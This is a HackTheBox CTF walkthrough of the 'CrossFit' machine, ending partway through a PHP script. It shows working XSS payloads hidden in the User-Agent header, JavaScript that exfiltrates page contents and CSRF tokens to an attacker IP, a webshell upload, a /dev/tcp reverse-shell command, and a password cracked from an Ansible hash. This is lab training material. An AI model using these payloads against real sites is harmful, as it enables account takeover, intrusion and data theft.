---
title: HTB: CrossFit
url: https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html
date: 2021-03-20T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: htb-crossfit, hackthebox, ctf, nmap, ftp-tls, openssl, wfuzz, vhosts, gobuster, xss, javascript, xmlhttprequest, cors, csrf, laravel, lftp, webshell, ansible, credentials, hashcat, php-shellcommand, vsftpd, pam, hidepid, pspy, reverse-engineering, ghidra, arbitrary-write, oswe-like
---

![CrossFit](https://0xdfimages.gitlab.io/img/crossfit-cover.png)

CrossFit is all about chaining attacks together to get the target to do my bidding. It starts with a cross-site scripting (XSS) attack against a website. The site detects the attack, and forwards my user agent to the admins to investigation. An XSS payload in the user-agent will trigger, giving some access there. I’ll abuse cross-origin resource sharing (CORS) to identify another subdomain, and then use the XSS to do a cross-site request forgery, having the admins create an account for me on that subdomain, which provides FTP access, where I can upload a webshell, and use the XSS once again to trigger it for a reverse shell. I’ll dig a hash out of ansible configs and crack it to get the next user. To escalate again, I’ll exploit a command injection vulnerability in a PHP plugin, php-shellcommand, by writing to the database. To get root, I’ll reverse engineer a binary that runs on a cron and figure out how to trick it to write a SSH key into root’s authorized\_keys file.

## Box Info

| Name | [CrossFit](https://hackthebox.com/machines/crossfit)  [CrossFit](https://hackthebox.com/machines/crossfit) [Play on HackTheBox](https://hackthebox.com/machines/crossfit) |
| --- | --- |
| Release Date | [19 Sep 2020](https://twitter.com/hackthebox_eu/status/1306631961486729217) |
| Retire Date | 20 Mar 2021 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for CrossFit |
| Radar Graph | Radar chart for CrossFit |
| First Blood User | 15:52:14[haqpl haqpl](https://app.hackthebox.com/users/76469) |
| First Blood Root | 1 day00:25:20[haqpl haqpl](https://app.hackthebox.com/users/76469) |
| Creators | [polarbearer polarbearer](https://app.hackthebox.com/users/159204)  [GibParadox GibParadox](https://app.hackthebox.com/users/125033) |

## Recon

### nmap

`nmap` found three open TCP ports, FTP (21), SSH (22), and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.208
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-22 16:48 EST
Nmap scan report for 10.10.10.208
Host is up (0.13s latency).
Not shown: 57242 closed ports, 8290 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 60.07 seconds
root@kali# nmap -p 21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.208
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-22 16:50 EST
Nmap scan report for 10.10.10.208
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US
| Not valid before: 2020-04-30T19:16:46
|_Not valid after:  3991-08-16T19:16:46
|_ssl-date: TLS randomness does not represent time
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b0:e7:5f:5f:7e:5a:4f:e8:e4:cf:f1:98:01:cb:3f:52 (RSA)
|   256 67:88:2d:20:a5:c1:a7:71:50:2b:c8:07:a4:b2:60:e5 (ECDSA)
|_  256 62:ce:a3:15:93:c8:8c:b6:8e:23:1d:66:52:f4:4f:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.01 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 10 buster.

### FTP - TCP 21

`nmap` shows an SSL cert on FTP for `*.crossfit.htb`. I’ll take a closer look at the certificate with [this technique](https://community.boomi.com/s/article/retrievingftptlssslservercertificate):

```

root@kali# openssl s_client -connect 10.10.10.208:21 -starttls ftp                
CONNECTED(00000003) 
Can't use SSL_get_servername                                                                                         
depth=0 C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
verify error:num=18:self signed certificate
verify return:1       
depth=0 C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb
verify return:1        
---                                                                                                                  
Certificate chain                                                                                                    
 0 s:C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb             
   i:C = US, ST = NY, O = Cross Fit Ltd., CN = *.crossfit.htb, emailAddress = info@gym-club.crossfit.htb             
---                                                                                                                  
Server certificate                                                                                                   
-----BEGIN CERTIFICATE-----                                                                                          
MIID0TCCArmgAwIBAgIUFlxL1ZITpUBfx69st7fRkJcsNI8wDQYJKoZIhvcNAQEL                                                     
BQAwdzELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5ZMRcwFQYDVQQKDA5Dcm9zcyBG
...[snip]...

```

While the CN is for `*.crossfit.htb`, the email address gives a unique subdomain I’ll want to note. I’ll add the following line to my `/etc/hosts` file:

```
10.10.10.208 crossfit.htb gym-club.crossfit.htb

```

`nmap` is usually pretty good at identifying anonymous FTP access, but I checked just to be sure, and it will require creds.

### Subdomain Fuzz

Given the use of subdomains on this host, I’ll start a `wfuzz` in the background to look for additional ones:

```

root@kali# wfuzz -u http://10.10.10.208 -H "Host: FUZZ.crossfit.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 10701
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.208/
Total requests: 100000

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                   
===================================================================

000037212:   400        12 L     53 W     425 Ch      "*"                                                                                                                                                                       

Total time: 875.0025
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 114.2853

```

It doesn’t find anything.

### crossfit.htb - TCP 80

The site when accessed as `crossfit.htb` or by IP just returns the default Apache Debian page:

![image-20210122165920289](https://0xdfimages.gitlab.io/img/image-20210122165920289.png)

### gym-club.crossfit.htb

#### Site

Visiting `gym-club.crossfit.htb` returns a page for a Crossfit gym:

[![](https://0xdfimages.gitlab.io/img/CrossFitClub.jpg)](https://0xdfimages.gitlab.io/img/CrossFitClub.jpg)

[*Click for full image*](https://0xdfimages.gitlab.io/img/CrossFitClub.jpg)

There’s a lot of stuff here, but I’ll focus on the parts I found that allow for interaction. On the blog post, `/blog-single.php`, there’s a comment form:

![image-20210122171713842](https://0xdfimages.gitlab.io/img/image-20210122171713842.png)

This form turns out to be interesting, which I’ll show in more detail later.

There’s also a Get In Touch form on `/contact.php`:

![image-20210122171750749](https://0xdfimages.gitlab.io/img/image-20210122171750749.png)

I tried basic SQL injection and XSS tests on this form, but didn’t find anything.

There’s a subscribe form on the `/jointheclub.php` site:

![image-20210122171918652](https://0xdfimages.gitlab.io/img/image-20210122171918652.png)

I tried putting in different things for the email to check for SMTP connections back to my IP, or SQL injections, but didn’t get anything useful from it.

#### Directory Brute Force

`gobuster` finds many of the paths I already found, but also `/security_threat`:

```

root@kali# gobuster dir -u http://gym-club.crossfit.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20 -o scans/gobuster-gymclub-root-medium-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://gym-club.crossfit.htb
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/01/22 17:09:04 Starting gobuster
===============================================================
/index.php (Status: 200)
/contact.php (Status: 200)
/img (Status: 301)
/images (Status: 301)
/gallery.php (Status: 200)
/css (Status: 301)
/blog.php (Status: 200)
/schedule.php (Status: 200)
/db.php (Status: 200)
/js (Status: 301)
/about-us.php (Status: 200)
/vendor (Status: 301)
/fonts (Status: 301)
/functions.php (Status: 200)
/security_threat (Status: 301)
===============================================================
2021/01/22 17:29:16 Finished
===============================================================

```

The directory is listable:

![image-20210122171046406](https://0xdfimages.gitlab.io/img/image-20210122171046406.png)

Visiting `report.php` just returns:

> Your are not allowed to access this page.

## Shell as www-data

### Identify XSS

#### Enumeration

I tried to post a comment to the the form at the bottom of the blog post. On doing so, it says that the content will be evaluated by a moderator:

![image-20210122172904544](https://0xdfimages.gitlab.io/img/image-20210122172904544.png)

Given the fact it will be reviewed and the box name (CROSSfit), this seems like a good place to try a cross site scripting (XSS) attack. I added `<script>` tags to my post:

![image-20210122173038053](https://0xdfimages.gitlab.io/img/image-20210122173038053.png)

On submitting, it returns a warning:

![image-20210122173102831](https://0xdfimages.gitlab.io/img/image-20210122173102831.png)

#### POC

I wasted a lot of time trying to get an XSS payload to get past this filter and return the success message. Eventually, I noticed the text of the warning. “A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.” What if I can get an XSS payload into that report, and get JavaScript running in the admin team’s session?

Because the browser information is called out as included in that report, I’ll add an XSS payload to the request user agent string. I’ll send the following POST using `curl`:

```

root@kali# curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=0xdf&email=0xdf@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.11%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.11/"></script>'

```

If this works, the `<script>` tag in the body will trigger the report, and then the `<script>` tag in the UA string will trigger a request to me from Crossfit. And that is just what I see on a Python webserver a few seconds after sending:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.208 - - [22/Jan/2021 17:36:39] "GET / HTTP/1.1" 200 -

```

I’ll also catch a request with `nc` to see the full headers being used by the admin team:

```

GET / HTTP/1.1
Host: 10.10.14.11
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gym-club.crossfit.htb/security_threat/report.php
Connection: keep-alive

```

The admin team is looking at the report in Firefox. I don’t see any vulnerabilities in that version of Firefox.

### XSS Fails

I first tried to leak a cookie with a payload like:

```

document.location="http://10.10.14.11/?c="+document.cookie;

```

I got a hit on my server, but no cookie:

```
10.10.10.208 - - [22/Jan/2021 17:46:57] "GET /?c= HTTP/1.1" 200 -

```

I also wanted to see what else was in `report.php`, as I’m sure that the person reading this can open it. This JavaScript will query `report.php`, and then when that request is complete, it will create a new request and send the results back to me as a POST (I’ll be using the XMLHttpRequest a good bit, so the [docs](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest) come in handy here):

```

var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if(fetch_req.readyState == XMLHttpRequest.DONE) {
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("POST", "http://10.10.14.11:3000", false);
        exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
    }
};
fetch_req.open("GET", "http://gym-club.crossfit.htb/security_threat/report.php", false);
fetch_req.send();

```

I’ll need to send it back to a different port from where I’m hosting this payload using Python HTTP Server (since it won’t accept POSTs or show the body), so I’ll setup `nc` on port 3000 to catch that.

I’ll run the attack:

```

root@kali# curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=0xdf&email=0xdf@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.11%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.11/threat_report.js"></script>'
...[snip]...

```

The request hits Python:

```
10.10.10.208 - - [22/Jan/2021 17:56:27] "GET /threat_report.js HTTP/1.1" 200 -

```

And then reached `nc`:

```

root@kali# nc -lnkp 3000
POST / HTTP/1.1
Host: 10.10.14.11:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gym-club.crossfit.htb/security_threat/report.php
Content-Type: text/plain;charset=UTF-8
Content-Length: 371
Origin: http://gym-club.crossfit.htb
Connection: keep-alive

Resp Code: 200
Page Source:
<!DOCTYPE html>
<html>
<head>
  <title>Security Report</title>
  <style>
    table, th, td {
      border: 1px solid black;
    }
  </style>
</head>
<body>
<h4>Logged XSS attempts</h4>
<table>
  <thead>
    <tr>
      <td>Timestamp</td>
      <td>User Agent</td>
      <td>IP Address</td>
    </tr>
  </thead>
<tbody>
</tbody>
</body>
</html>

```

Unfortunately for me, there’s nothing interesting in this page. I did find if I sent two XSS attempts really fast, I could see the second one in the table. But that doesn’t buy me much.

### Subdomain Enum Again

At this point I got a hint to try to use the Origin header to enumerate subdomains, which is explained [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS). The `Origin` headers is a part of a mechanism called cross-origin resource sharing (CORS) that allows a page to page in domain A to make resources accessible to domain B without making them accessible to the larger world. Browsers will allow embedding of things like images, stylesheets, scripts, etc, but specifically block things like AJAX requests in JavaScript with [same-origin](https://en.wikipedia.org/wiki/Same-origin_policy) policy. The idea is that a server can specify what domains, other than its own, the browser should allow loading of resources. If the server includes the `Origin:` header, then the receiving server will respond with a `Access-Control-Allow-Origin:` header to let the server know it is ok to access these assets.

The idea here is that if Crossfit explicitly allows another domain, it must exist (and likely explicitly allows requests from `gym-club`).

I’ll use `wfuzz` again, this time with the `-H "Origin: http://FUZZ.crossfit.htb"`. Additionally, instead of looking for a change in the size of the body, this time I’m looking for the presence of a header. The `wfuzz` [docs advanced usage page](https://wfuzz.readthedocs.io/en/latest/user/advanced.html) lay out all the different things you can filter on. Response headers is `r.headers.response`. The `a ~ b` operator is equivalent to Python’s `b in a`. So `--filter "r.headers.response ~ 'Access-Control-Allow-Origin'"` will filter for any response with that header. It’s also worth nothing that a quoted string must be in single quotes (`'`), so it will throw an error if you swap `"` and `'` in the filter above.

```

root@kail# wfuzz -u http://gym-club.crossfit.htb/ -H "Origin: http://FUZZ.crossfit.htb" --filter "r.headers.response ~ 'Access-Control-Allow-Origin'" -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top
100000.txt 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gym-club.crossfit.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                 
=====================================================================

000000014:   200        755 L    2170 W     36330 Ch    "ftp"                                                   

Total time: 488.0333
Processed Requests: 100000
Filtered Requests: 99999
Requests/sec.: 204.9040

```

It finds the `ftp` subdomain right away. I can recreate this result in Repeater with the following request:

```

GET / HTTP/1.1
Host: gym-club.crossfit.htb
Origin: http://ftp.crossfit.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

The response:

```

HTTP/1.1 200 OK
Date: Sat, 23 Jan 2021 11:43:28 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding,Origin
Access-Control-Allow-Origin: http://ftp.crossfit.htb
Access-Control-Allow-Credentials: true
Content-Length: 36336
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="zxx">
...[snip]...

```

### Interacting with ftp.crossfit.htb

From my machine, `ftp.crossfit.htb` just returns the default Apache page, but the results above suggest it could be different coming from `gym-club`. I’ve already got JavaScript to make an HTTP query. I’ll repurpose that:

```

var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if(fetch_req.readyState == XMLHttpRequest.DONE) {
        var exfil_req = new XMLHttpRequest();
        exfil_req.open("POST", "http://10.10.14.11:3000", false);
        exfil_req.send("Resp Code: " + fetch_req.status + "\nPage Source:\n" + fetch_req.response);
    }
};
fetch_req.open("GET", "http://ftp.crossfit.htb/", false);
fetch_req.send();

```

On sending that with curl:

```

root@kali# curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=0xdf&email=0xdf@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.11%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.11/ftp-create-get.js"></script>'

```

The page source is returned to `nc` listening on TCP 3000:

```

<!DOCTYPE html>

<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>

<br>
<div class="container">
        <div class="row">
        <div class="col-lg-12 margin-tb">
            <div class="pull-left">
                <h2>FTP Hosting - Account Management</h2>
            </div>
            <div class="pull-right">
                <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>
            </div>
        </div>
    </div>
    <table class="table table-bordered">
        <tr>
            <th>No</th>
            <th>Username</th>
            <th>Creation Date</th>
            <th width="280px">Action</th>
        </tr>
    </table>
</div>
</body>
</html>

```

The link to `http://ftp.crossfit.htb/accounts/create` is interesting. I’ll get that page next. It contains a form allowing a user to set a username and password:

```

<form action="http://ftp.crossfit.htb/accounts" method="POST">
    <input type="hidden" name="_token" value="2kUXRzOMFY721Bppx9GnlMDpRKsc9CcX1qVzbD3H">
     <div class="row">
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Username:</strong>
                <input type="text" name="username" class="form-control" placeholder="Username">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12">
            <div class="form-group">
                <strong>Password:</strong>
                <input type="password" name="pass" class="form-control" placeholder="Password">
            </div>
        </div>
        <div class="col-xs-12 col-sm-12 col-md-12 text-center">
                <button type="submit" class="btn btn-primary">Submit</button>
        </div>
    </div>

</form>

```

### CSRF Account Request

I want to create an account from the admin’s machine. This is now moving from XSS to Cross-Site Request Forgery (CSRF / XSRF), where I trick some other person to take an action I want under their access/authority. In this case, I want the admin to create an account on ftp.crossfit.htb for me.

The challenge here is the `_token` value in the form. I need to get that, and then return it with the request. Googling for `csrf "_token"`, the first two responses are for the Laravel framework:

![image-20210123070635445](https://0xdfimages.gitlab.io/img/image-20210123070635445.png)

According to [the docs](https://laravel.com/docs/8.x/csrf):

> Laravel automatically generates a CSRF “token” for each active [user session](https://laravel.com/docs/8.x/session) managed by the application. This token is used to verify that the authenticated user is the person actually making the requests to the application. Since this token is stored in the user’s session and changes each time the session is regenerated, a malicious application is unable to access it.

That means I need to make sure that the CSRF is collected and then re-sent within a single session. To do that, I just [need to set](https://stackoverflow.com/questions/50948129/use-the-same-session-in-xmlhttprequest) `request.withCredentials = true;` in my `XMLHttpRequest` object.

I’ll start with a request to get the page at `ftp.crossfit.htb/accounts/create`. In that page, I’ll find the CSRF token, and then send a POST to `ftp.crossfit.htb/accounts` with the token and a username and password. I’ll then POST the results of that back to my host.

```

function get_token(body) {
    var dom = new DOMParser().parseFromString(body, 'text/html');
    return dom.getElementsByName('_token')[0].value;
}

var fetch_req = new XMLHttpRequest();
fetch_req.onreadystatechange = function() {
    if (fetch_req.readyState == XMLHttpRequest.DONE) {
        var token = get_token(fetch_req.response);

        var reg_req = new XMLHttpRequest();
        reg_req.onreadystatechange = function() {
            if (reg_req.readyState == XMLHttpRequest.DONE) {
                var exfil_req = new XMLHttpRequest();
                exfil_req.open("POST", "http://10.10.14.11:3000/", false);
                exfil_req.send(reg_req.response);
            }
        };
        reg_req.open("POST", "http://ftp.crossfit.htb/accounts", false);
        reg_req.withCredentials = true;
        reg_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        reg_req.send("_token=" + token + "&username=0xdf&pass=0xdf0xdf");
    }
};

fetch_req.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
fetch_req.withCredentials = true;
fetch_req.send();

```

Run it with `curl` (at this point I’ve added a `grep` on the results for the XSS message to stop printing a full page each time, but still make sure the request didn’t break):

```

root@kali# curl -s http://gym-club.crossfit.htb/blog-single.php --data 'name=0xdf&email=0xdf@crossfit.htb&phone=9999999999&message=%3Cscript+src%3D%22http%3A%2F%2F10.10.14.11%22%3E%3C%2Fscript%3E&submit=submit' -H 'User-Agent: <script src="http://10.10.14.11/ftp-create-account.js"></script>' | grep -i xss
                    <div class='alert alert-danger' role='alert'><h4>XSS attempt detected</h4><hr>A security report containing your IP address and browser information will be generated and our admin team will be immediately notified.</div><br>                    <div class="leave-comment-form">

```

After a GET at my Python webserver on 80 for `ftp-create-account.js`, I see the POST come back at `nc`:

```

POST / HTTP/1.1
Host: 10.10.14.11:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://gym-club.crossfit.htb/security_threat/report.php
Content-Type: text/plain;charset=UTF-8
Content-Length: 1722
Origin: http://gym-club.crossfit.htb
Connection: keep-alive

<!DOCTYPE html>
<html>
<head>
    <title>FTP Hosting - Account Management</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
</head>
<body>
<br>
<div class="container">
        <div class="row">
        <div class="col-lg-12 margin-tb">
            <div class="pull-left">
                <h2>FTP Hosting - Account Management</h2>
            </div>
            <div class="pull-right">
                <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>
            </div>
        </div>
    </div>
            <div class="alert alert-success">
            <p>Account created successfully.</p>
        </div>
    
    <table class="table table-bordered">
        <tr>
            <th>No</th>
            <th>Username</th>
            <th>Creation Date</th>
            <th width="280px">Action</th>
        </tr>
                <tr>
            <td>1</td>
            <td>0xdf</td>
            <td>2021-01-26 18:25:04</td>
            <td>
                <form action="http://ftp.crossfit.htb/accounts/71" method="POST">
                    <a class="btn btn-info" href="http://ftp.crossfit.htb/accounts/71">Show</a>
                    <a class="btn btn-primary" href="http://ftp.crossfit.htb/accounts/71/edit">Edit</a>
                    <input type="hidden" name="_token" value="3F6V6byt2R3am6BnIEOmBOjIazAXXmRPqkh6j1UQ">
                    <input type="hidden" name="_method" value="DELETE">
                    <button type="submit" class="btn btn-danger">Delete</button>
                </form>
            </td>
        </tr>        
    </table>
</div>

</body>
</html>

```

It created my account!

### FTP

Trying to connect fails because encryption is required:

```

root@kali# ftp ftp.crossfit.htb
Connected to gym-club.crossfit.htb.
220 Cross Fit Ltd. FTP Server
Name (ftp.crossfit.htb:root): 0xdf
530 Non-anonymous sessions must use encryption.
Login failed.
421 Service not available, remote server has closed connection

```

The `ftp` client on standard Linux distributions doesn’t have that option. I’ll install `lftp` (`apt install lftp`) and run it:

```

root@kali# lftp ftp.crossfit.htb -u 0xdf
Password: 
lftp 0xdf@ftp.crossfit.htb:~> ls                     
ls: Fatal error: Certificate verification: Not trusted (25:EC:D2:FE:6C:9D:77:04:EC:7D:D7:92:87:67:4B:C3:8D:0E:CB:CE)

```

That is fixed by setting the SSL verification to false:

```

lftp 0xdf@ftp.crossfit.htb:~> set ssl:verify-certificate false

```

Now I can list the FTP root:

```

lftp 0xdf@ftp.crossfit.htb:~> ls
drwxrwxr-x    2 33       1002         4096 Sep 21 09:45 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html

```

It looks like I’m in `/var/www`, where `html` is the folder with the Apache default, `ftp` is the site I registered this account on, and `gym-club` is the main page. `development-test` is a new one.

### Webshell

I’ll upload a webshell over FTP:

```

lftp 0xdf@ftp.crossfit.htb:/development-test> put /opt/shells/php/cmd.php
35 bytes transferred                                           
lftp 0xdf@ftp.crossfit.htb:/development-test> ls
-rw-r--r--    1 1002     1002           35 Jan 26 18:39 cmd.php

```

Unfortunately, I can’t reach it. I wonder if it’s only available from inside just like FTP? The JavaScript is simple, just one request:

```

var req = new XMLHttpRequest();
req.open("GET", "http://development-test.crossfit.htb/cmd.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.11/443+0>%261'", false);
req.send()

```

I’ll send the XSS request to trigger it, see it requested from Python webserver, and a shell arrives at `nc`:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.208.
Ncat: Connection from 10.10.10.208:35308.
bash: cannot set terminal process group (695): Inappropriate ioctl for device
bash: no job control in this shell
www-data@crossfit:/var/www/development-test$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade my shell:

```

www-data@crossfit:/home$ python3 -c 'import pty;pty.spawn("bash")'
www-data@crossfit:/home$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@crossfit:/home$

```

## Shell as hank

### Enumeration

There are two users on this box:

```

www-data@crossfit:/home$ ls
hank  isaac

```

I can see into the root of each directory (`hank` has `user.txt`), but can’t read anything.

Eventually in digging around, I find `/etc/ansible`. [Ansible](https://www.ansible.com/) provide a way to automate the creating and provisioning of hosts using “playbooks” that describe different aspects.

There’s one playbook in `/etc/ansible/playbooks`:

```

www-data@crossfit:/etc/ansible/playbooks$ ls
adduser_hank.yml
www-data@crossfit:/etc/ansible/playbooks$ cat adduser_hank.yml 
---
- name: Add new user to all systems
  connection: network_cli
  gather_facts: false
  hosts: all
  tasks:
    - name: Add the user 'hank' with default password and make it a member of the 'admins' group
      user:
        name: hank
        shell: /bin/bash
        password: $6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/
        groups: admins
        append: yes

```

This playbook creates a user, and there’s a password hash.

### Cracking Hash

`hashcat` will break this hash with `rockyou` pretty quickly:

```

root@kali# hashcat -m 1800 hank.hash /usr/share/wordlists/rockyou.txt 
...[snip]...
$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG/:powerpuffgirls

```

### su

That password works to `su` as hank on Crossfit:

```

www-data@crossfit:/etc/ansible/playbooks$ su hank - 
Password: 
hank@crossfit:/etc/ansible/playbooks$

```

And I can read `user.txt`:

```

hank@crossfit:~$ cat user.txt
be673d70************************

```

## Shell as isaac

### Enumeration

#### send\_updates.php

There’s not much interesting in hank’s home directory, but hank is a member of the admins group:

```

hank@crossfit:~$ id
uid=1004(hank) gid=1006(hank) groups=1006(hank),1005(admins)

```

This allows reading in the `send_updates` folder in isaac’s homedir:

```

hank@crossfit:/home/isaac$ ls -l
total 4
drwxr-x--- 4 isaac admins 4096 May  9  2020 send_updates
hank@crossfit:/home/isaac/send_updates$ ls -l
total 20
-rw-r----- 1 isaac admins   74 May  4  2020 composer.json
-rw-r----- 1 isaac admins 1943 May  4  2020 composer.lock
drwxr-x--- 2 isaac isaac  4096 May  7  2020 includes
-rw-r----- 1 isaac admins 1085 May  9  2020 send_updates.php
drwxr-x--- 4 isaac isaac  4096 May  4  2020 vendor

```

It also happens that `send_updates.php` is in `/etc/crontab` to run every minute as isaac:

```

hank@crossfit:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

MAILTO=""
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   isaac   /usr/bin/php /home/isaac/send_updates/send_updates.php

```

The script “sends emails to users in the mailing list”:

```

<?php
/***************************************************
 * Send email updates to users in the mailing list *
 ***************************************************/
require("vendor/autoload.php");
require("includes/functions.php");
require("includes/db.php");
require("includes/config.php");
use mikehaertl\shellcommand\Command;

if($conn)
{
    $fs_iterator = new FilesystemIterator($msg_dir);

    foreach ($fs_iterator as $file_info)
    {
        if($file_info->isFile())
        {
            $full_path = $file_info->getPathname(); 
            $res = $conn->query('SELECT email FROM users');
            while($row = $res->fetch_array(MYSQLI_ASSOC))
            {
                $command = new Command('/usr/bin/mail');
                $command->addArg('-s', 'CrossFit Club Newsletter', $escape=true);
